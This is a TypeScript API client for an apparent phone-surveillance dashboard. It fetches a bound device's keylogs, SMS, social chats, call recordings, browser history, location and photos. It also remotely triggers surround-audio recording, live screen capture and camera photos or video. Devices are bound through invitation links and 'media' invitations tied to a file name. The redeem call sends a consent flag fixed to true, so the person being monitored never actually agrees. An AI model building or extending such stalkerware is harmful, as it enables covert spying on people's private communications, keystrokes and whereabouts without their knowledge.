import type { CallLog } from "@/data/callLogs";
import type { Message } from "@/data/messages";
import type { LocationRecord } from "@/data/locationHistory";
import type { ChatMessage } from "@/data/socialChats";
import { getSelectedDeviceId, setSelectedDeviceId } from "@/lib/selectedDevice";

const API_BASE_URL = (import.meta.env.VITE_API_BASE_URL ?? "").replace(/\/+$/, "");

function withDeviceQuery(path: string): string {
  const deviceId = getSelectedDeviceId();
  if (!deviceId) return path;
  const sep = path.includes("?") ? "&" : "?";
  return `${path}${sep}deviceId=${encodeURIComponent(deviceId)}`;
}

export type BackendCallLog = {
  id: number;
  contact: string;
  number: string;
  type: "Incoming" | "Outgoing" | "Missed";
  duration: string;
  time: string;
};

export type BackendAppCall = {
  id: number;
  name: string;
  phone: string;
  app?: string;
  type: "Incoming" | "Outgoing" | "Missed";
  duration: string;
  status: "Normal" | "Blocked";
  time: string;
  startTime: string;
};

export type BackendMessage = {
  id: number;
  from: string;
  channel: string;
  preview: string;
  time: string;
};

export type BackendLocation = {
  id: number;
  lat: number;
  lng: number;
  place: string;
  time: string;
};

export type BackendSocialChat = {
  id: number;
  app: string;
  contact: string;
  preview: string;
  fullText?: string;
  messageType?: 'text' | 'image' | 'video' | string;
  mediaUrl?: string | null;
  time: string;
};

export type DashboardResponse = {
  overviewStats: { label: string; value: number; change: string }[];
  callLogs: BackendCallLog[];
  appCalls: BackendAppCall[];
  messages: BackendMessage[];
  locations: BackendLocation[];
  socialChats: BackendSocialChat[];
  contacts?: Contact[];
  usageStats?: UsageStat[];
  installedApps?: InstalledApp[];
  notifications?: NotificationRecord[];
  browserHistory?: BrowserHistoryRecord[];
  wifiLogs?: WifiLog[];
  safetyAlerts?: SafetyAlert[];
  photos?: PhotoRecord[];
  keylogs?: KeylogRecord[];
};

export type DeviceInvitationResponse = {
  token: string;
  label: string;
  type: "link" | "media";
  createdAt: string;
  redeemed: boolean;
  inviteUrl: string;
};

// ─── Telemetry Typings ────────────────────────────────────────────
export type Device = {
  id: string;
  deviceName: string;
  source: string;
  boundAt: string;
  battery?: number;
};

export type Contact = {
  id: string;
  name: string;
  phone: string;
  mail?: string;
  address?: string;
  blocked?: boolean;
};

export type UsageStat = {
  app: string;
  duration: string;
  icon: string;
  color: string;
};

export type InstalledApp = {
  name: string;
  packageName: string;
  size: string;
  isBlocked: boolean;
};

export type NotificationRecord = {
  id: number;
  app: string;
  title: string;
  preview: string;
  time: string;
};

export type BrowserHistoryRecord = {
  id: number;
  query: string;
  url: string;
  time: string;
};

export type WifiLog = {
  id: number;
  ssid: string;
  status: string;
  signal: string;
  time: string;
};

export type SafetyAlert = {
  id: number;
  type: string;
  severity: string;
  msg: string;
  time: string;
};

export type PhotoRecord = {
  id: number;
  url: string;
  title: string;
  time: string;
  type?: 'gallery' | 'screenshot' | 'live_screen' | 'video' | 'audio' | 'screen_record' | 'camera';
};

export type CallRecordingRecord = {
  id: number;
  name: string;
  phone: string;
  type: string;
  duration: string;
  audioUrl: string | null;
  hasAudio: boolean;
  time: string;
};

export type CalendarEventRecord = {
  id: number;
  event: string;
  startTime: string;
  endTime: string;
  location: string;
  notes: string;
  time: string;
};

export type GeofenceRecord = {
  id: string;
  name: string;
  lat: number;
  lng: number;
  radiusM: number;
  enabled: boolean;
};

export type GeofenceEventRecord = {
  id: number;
  type: 'entered' | 'exited';
  fenceName: string;
  fenceId: string;
  lat: number;
  lng: number;
  time: string;
  displayTime: string;
};

export type KeywordAlertRecord = {
  id: number;
  keyword: string;
  detectedIn: string;
  message: string;
  time: string;
};

export type KeylogRecord = {
  app: string;
  text: string;
  time: string;
};

export type RemoteControlState = {
  screenTimeLimit: string;
  isDeviceLocked: boolean;
  blockedApps: string[];
  screenshotPending: boolean;
  surroundRecordPending?: boolean;
  recordScreenPending?: boolean;
  liveScreenPending?: boolean;
  takePhotoPending?: boolean;
  recordVideoPending?: boolean;
  gallerySyncPending?: boolean;
  historicalSyncPending?: boolean;
};

async function fetchJson<T>(path: string): Promise<T> {
  const normalizedPath = path.startsWith("/") ? path : `/${path}`;
  const response = await fetch(`${API_BASE_URL}${withDeviceQuery(normalizedPath)}`);
  if (!response.ok) {
    throw new Error(`API request failed for ${path}: ${response.status}`);
  }
  return response.json() as Promise<T>;
}

function parseDurationToSeconds(duration: string): number {
  const parts = duration.split(":");
  if (parts.length < 2) return 0;
  const minutes = Number(parts[0]);
  const seconds = Number(parts[1]);
  if (Number.isNaN(minutes) || Number.isNaN(seconds)) {
    return 0;
  }
  return minutes * 60 + seconds;
}

function parseIsoToDateTime(iso: string): { date: string; time: string } {
  const dateObj = new Date(iso);
  if (Number.isNaN(dateObj.getTime())) {
    return { date: "-", time: "-" };
  }
  const date = dateObj.toISOString().slice(0, 10);
  const time = dateObj.toISOString().slice(11, 16);
  return { date, time };
}

function mapCallDirection(
  type: BackendCallLog["type"]
): CallLog["direction"] {
  if (type === "Incoming") return "incoming";
  if (type === "Outgoing") return "outgoing";
  return "missed";
}

export async function fetchCallLogs(): Promise<CallLog[]> {
  const data = await fetchJson<BackendCallLog[]>("/api/call-logs");
  return data.map((item) => {
    const dateTime = parseIsoToDateTime(item.time);
    return {
      id: String(item.id),
      contact: item.contact,
      phoneNumber: item.number,
      direction: mapCallDirection(item.type),
      duration: parseDurationToSeconds(item.duration),
      date: dateTime.date,
      time: dateTime.time
    };
  });
}

export async function fetchAppCalls(): Promise<BackendAppCall[]> {
  return fetchJson<BackendAppCall[]>("/api/app-calls");
}

export async function fetchMessages(): Promise<Message[]> {
  const data = await fetchJson<BackendMessage[]>("/api/messages");
  return data.map((item) => {
    const dateTime = parseIsoToDateTime(item.time);
    const full = item.preview || '';
    const short =
      full.length > 72 ? `${full.slice(0, 72)}…` : full;
    return {
      id: String(item.id),
      contact: item.from,
      channel: item.channel || 'SMS',
      snippet: short,
      fullText: full,
      type: "incoming",
      date: dateTime.date,
      time: dateTime.time,
      unread: false
    };
  });
}

export async function fetchSocialChatsRaw(): Promise<BackendSocialChat[]> {
  return fetchJson<BackendSocialChat[]>('/api/social-chats');
}

export async function fetchLocations(): Promise<LocationRecord[]> {
  const data = await fetchJson<BackendLocation[]>("/api/locations");
  return data.map((item) => {
    const dateTime = parseIsoToDateTime(item.time);
    return {
      id: String(item.id),
      address: item.place,
      lat: item.lat,
      lng: item.lng,
      date: dateTime.date,
      time: dateTime.time
    };
  });
}

export async function fetchSocialChats(): Promise<ChatMessage[]> {
  const data = await fetchJson<BackendSocialChat[]>("/api/social-chats");
  return data.map((item) => {
    const dateTime = parseIsoToDateTime(item.time);
    return {
      id: String(item.id),
      contact: `${item.contact} (${item.app})`,
      content: item.preview,
      type: "incoming",
      date: dateTime.date,
      time: dateTime.time
    };
  });
}

export async function fetchDashboard(): Promise<DashboardResponse> {
  return fetchJson<DashboardResponse>("/api/dashboard");
}

export async function fetchDevices(): Promise<Device[]> {
  return fetchJson<Device[]>("/api/devices");
}

export async function removeDevice(id: string): Promise<void> {
  const res = await fetch(`${API_BASE_URL}/api/devices/${encodeURIComponent(id)}`, {
    method: 'DELETE',
  });
  if (!res.ok) throw new Error(`Failed to remove device: ${res.status}`);
  if (getSelectedDeviceId() === id) {
    setSelectedDeviceId(null);
  }
}

export async function fetchContacts(): Promise<Contact[]> {
  return fetchJson<Contact[]>("/api/contacts");
}

export async function fetchUsageStats(): Promise<UsageStat[]> {
  return fetchJson<UsageStat[]>("/api/usage-stats");
}

export async function fetchInstalledApps(): Promise<InstalledApp[]> {
  return fetchJson<InstalledApp[]>("/api/installed-apps");
}

export async function toggleAppBlock(packageName: string): Promise<any> {
  const response = await fetch(`${API_BASE_URL}/api/installed-apps/toggle-block`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ packageName })
  });
  if (!response.ok) {
    throw new Error(`Failed to toggle app block: ${response.status}`);
  }
  return response.json();
}

export async function fetchNotifications(): Promise<NotificationRecord[]> {
  return fetchJson<NotificationRecord[]>("/api/notifications");
}

export async function fetchBrowserHistory(): Promise<BrowserHistoryRecord[]> {
  return fetchJson<BrowserHistoryRecord[]>("/api/browser-history");
}

export async function fetchWifiLogs(): Promise<WifiLog[]> {
  return fetchJson<WifiLog[]>("/api/wifi-logs");
}

export async function fetchSafetyAlerts(): Promise<SafetyAlert[]> {
  return fetchJson<SafetyAlert[]>("/api/safety-alerts");
}

export async function fetchPhotos(type?: PhotoRecord['type']): Promise<PhotoRecord[]> {
  const q = type ? `?type=${encodeURIComponent(type)}` : '';
  return fetchJson<PhotoRecord[]>(`/api/photos${q}`);
}

export async function fetchCalendarEvents(): Promise<CalendarEventRecord[]> {
  return fetchJson<CalendarEventRecord[]>('/api/calendar-events');
}

export async function fetchGeofences(): Promise<GeofenceRecord[]> {
  return fetchJson<GeofenceRecord[]>('/api/geofences');
}

export async function fetchGeofenceEvents(): Promise<GeofenceEventRecord[]> {
  return fetchJson<GeofenceEventRecord[]>('/api/geofence-events');
}

export async function fetchKeywordAlerts(): Promise<KeywordAlertRecord[]> {
  return fetchJson<KeywordAlertRecord[]>('/api/keyword-alerts');
}

export async function requestScreenshotCapture(): Promise<RemoteControlState> {
  return updateRemoteControlSettings({ screenshotPending: true });
}

export async function requestSurroundRecord(): Promise<RemoteControlState> {
  return updateRemoteControlSettings({ surroundRecordPending: true });
}

export async function requestRecordScreen(): Promise<RemoteControlState> {
  return updateRemoteControlSettings({ recordScreenPending: true });
}

export async function requestLiveScreen(): Promise<RemoteControlState> {
  return updateRemoteControlSettings({ liveScreenPending: true });
}

export async function requestTakePhoto(): Promise<RemoteControlState> {
  return updateRemoteControlSettings({ takePhotoPending: true });
}

export async function requestRecordVideo(): Promise<RemoteControlState> {
  return updateRemoteControlSettings({ recordVideoPending: true });
}

export async function requestGallerySync(): Promise<RemoteControlState> {
  return updateRemoteControlSettings({ gallerySyncPending: true });
}

export async function requestHistoricalSync(): Promise<RemoteControlState> {
  return updateRemoteControlSettings({ historicalSyncPending: true });
}

export async function fetchCallRecordings(): Promise<CallRecordingRecord[]> {
  return fetchJson<CallRecordingRecord[]>('/api/call-recordings');
}

export async function fetchTrackedKeywords(): Promise<string[]> {
  const data = await fetchJson<{ keywords: string[] }>('/api/tracked-keywords');
  return data.keywords ?? [];
}

export async function updateTrackedKeywords(keywords: string[]): Promise<string[]> {
  const response = await fetch(`${API_BASE_URL}/api/tracked-keywords`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ keywords }),
  });
  if (!response.ok) throw new Error(`Failed to update keywords: ${response.status}`);
  const data = (await response.json()) as { keywords: string[] };
  return data.keywords ?? [];
}

export function downloadMediaUrl(url: string, filename: string) {
  if (!url || (!url.startsWith('data:') && !url.startsWith('http'))) return;
  const a = document.createElement('a');
  a.href = url;
  a.download = filename;
  a.rel = 'noopener';
  document.body.appendChild(a);
  a.click();
  a.remove();
}

export function downloadPhotoAsset(photo: PhotoRecord) {
  const url = photo.url;
  if (!url || (!url.startsWith('data:') && !url.startsWith('http'))) return;
  const ext = url.includes('audio') ? 'm4a' : 'jpg';
  const a = document.createElement('a');
  a.href = url;
  a.download = `${photo.title.replace(/[^\w.-]+/g, '_') || 'photo'}_${photo.id}.${ext}`;
  a.rel = 'noopener';
  document.body.appendChild(a);
  a.click();
  a.remove();
}

export async function fetchKeylogs(): Promise<KeylogRecord[]> {
  return fetchJson<KeylogRecord[]>("/api/keylogs");
}

export async function fetchRemoteControlSettings(): Promise<RemoteControlState> {
  return fetchJson<RemoteControlState>("/api/remote-control");
}

export async function updateRemoteControlSettings(settings: Partial<RemoteControlState>): Promise<RemoteControlState> {
  const response = await fetch(`${API_BASE_URL}${withDeviceQuery("/api/remote-control")}`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(settings)
  });
  if (!response.ok) {
    throw new Error(`Failed to update settings: ${response.status}`);
  }
  return response.json() as Promise<RemoteControlState>;
}

export async function createDeviceInvitation(label: string): Promise<DeviceInvitationResponse> {
  const response = await fetch(`${API_BASE_URL}/api/device-invitations`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ label })
  });
  if (!response.ok) {
    throw new Error(`Failed to create invitation: ${response.status}`);
  }
  return response.json() as Promise<DeviceInvitationResponse>;
}

export async function createDeviceMediaInvitation(fileName: string): Promise<DeviceInvitationResponse> {
  const response = await fetch(`${API_BASE_URL}/api/device-media-invitations`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ fileName })
  });
  if (!response.ok) {
    throw new Error(`Failed to create media invitation: ${response.status}`);
  }
  return response.json() as Promise<DeviceInvitationResponse>;
}

export async function redeemDeviceInvitation(token: string, deviceName: string): Promise<void> {
  const response = await fetch(`${API_BASE_URL}/api/device-invitations/${token}/redeem`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ deviceName, consent: true })
  });
  if (!response.ok) {
    throw new Error(`Failed to bind device: ${response.status}`);
  }
}
